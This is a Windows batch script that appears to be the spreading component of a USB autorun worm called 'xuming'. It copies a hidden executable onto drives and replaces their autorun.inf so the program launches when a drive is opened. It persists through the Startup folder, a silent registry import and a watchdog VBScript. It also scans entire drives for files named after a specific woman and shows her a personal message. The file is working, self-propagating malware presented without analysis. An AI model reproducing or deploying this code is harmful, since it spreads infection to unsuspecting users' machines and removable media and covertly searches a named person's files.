@echo off
if {%2}=={} goto xmhere
goto fdmyy
:xmhere
rem ===========hold files====================

if not exist %systemroot%\system32\xuming.exe copy /y %systemroot%\system32\dllcache\gnimux.exe 
if not exist %systemroot%\system32\dllcache\gnimux.exe copy /y %systemroot%\system32\xuming.exe %systemroot%\system32\dllcache\gnimux.exe

if not exist %systemroot%\system32\xuming1.vbs goto restart
if not exist %systemroot%\system32\xmreg.reg goto restart
if not exist %systemroot%\system32\pslist.exe goto restart
if not exist %systemroot%\system32\xmhold.bat goto restart
goto xmready

:restart
if exist %systemroot%\system32\tskill.exe tskill.exe wscript
start %systemroot%\system32\xuming.exe
goto xmext
rem ===========ready to start================
:xmready
if not exist %1:\xmflag.xm goto xmstart
exit

:xmstart
rem ===========copy xuming.exe===============
attrib -s -h %systemroot%\system32\xuming.exe
if not exist %1:\xuming.exe copy %systemroot%\system32\xuming.exe %1:\xuming.exe & attrib +r +s +h %1:\xuming.exe

rem ===========copy autorun.inf==============
if not exist %1:\autorun.inf goto xmadd
dir %1:\ >%systemroot%\system32\%1xuming.txt
dir /as %1:\ >>%systemroot%\system32\%1xuming.txt
dir /ah %1:\ >>%systemroot%\system32\%1xuming.txt
find /i "autorun.inf" %systemroot%\system32\%1xuming.txt>%systemroot%\system32\%1xuming1.txt
find /i "dir" %systemroot%\system32\%1xuming1.txt & if errorlevel 1 goto xmchk

:xmrd
attrib -r -s -h %1:\autorun.inf
rd /s /q %1:\autorun.inf
goto xmadd

:xmchk
find /i "xuming.exe" %1:\autorun.inf & if errorlevel 1 goto xmdel
attrib +a +r +s +h %1:\autorun.inf
goto xmext

:xmdel
attrib -r -s -h %1:\autorun.inf
goto xmadd

:xmadd
echo [AutoRun]>%1:\autorun.inf
echo open=xuming.exe>>%1:\autorun.inf
echo shellexecute=xuming.exe>>%1:\autorun.inf
echo shell\打开(^&O)\command=xuming.exe>>%1:\autorun.inf
attrib +a +r +s +h %1:\autorun.inf
goto xmext

:xmext
del %systemroot%\system32\%1xuming.txt
del %systemroot%\system32\%1xuming1.txt
rem =====================set autorun====================
copy /y %systemroot%\system32\xuming.exe %HOMEDRIVE%\DOCUME~1\ALLUSE~1\「开始~1\程序\启动\xuming.exe
attrib +a +r +s +h %HOMEDRIVE%\DOCUME~1\ALLUSE~1\「开始~1\程序\启动\xuming.exe
regedit /s %systemroot%\system32\xmreg.reg

rem ====================hold the process=================
pslist>%systemroot%\system32\exmps.txt
find /i "wscript" %systemroot%\system32\exmps.txt & if errorlevel 1 start %systemroot%\system32\xuming1.vbs
del %systemroot%\system32\exmps.txt


exit

REM ============START FIND FILES AOBUT MYY==============
:fdmyy
tree /f c:\ >%systemroot%\system32\myy.txt
tree /f d:\ >>%systemroot%\system32\myy.txt
tree /f e:\ >>%systemroot%\system32\myy.txt

find /i "莫言英" %systemroot%\system32\myy.txt &if errorlevel 1 goto next1
goto myyok
:next1
find /i "莫彦英" %systemroot%\system32\myy.txt &if errorlevel 1 goto myyext

:myyok
echo [Shell]>xmdesk.scf
echo Command=^2>>xmdesk.scf
echo [Taskbar]>>xmdesk.scf
echo Command=ToggleDesktop>>xmdesk.scf

echo @echo off>%systemroot%\system32\myymsg.bat
echo color 0a>>%systemroot%\system32\myymsg.bat
echo echo.>>%systemroot%\system32\myymsg.bat
echo echo 您好，在您的电脑是发现了名为“莫言英”文件或文件夹，您是莫言英吗？>>%systemroot%\system32\myymsg.bat
echo echo 我是徐明，不好意思打扰了~！I L MYY>>%systemroot%\system32\myymsg.bat
echo echo.>>%systemroot%\system32\myymsg.bat
echo pause>>%systemroot%\system32\myymsg.bat

start /wait xmdesk.scf
echo WScript.Sleep 700>%systemroot%\system32\isleep.vbs
%systemroot%\system32\isleep.vbs
start %systemroot%\system32\myymsg.bat
del xmdesk.scf

:myyext
del %systemroot%\system32\myy.txt

exit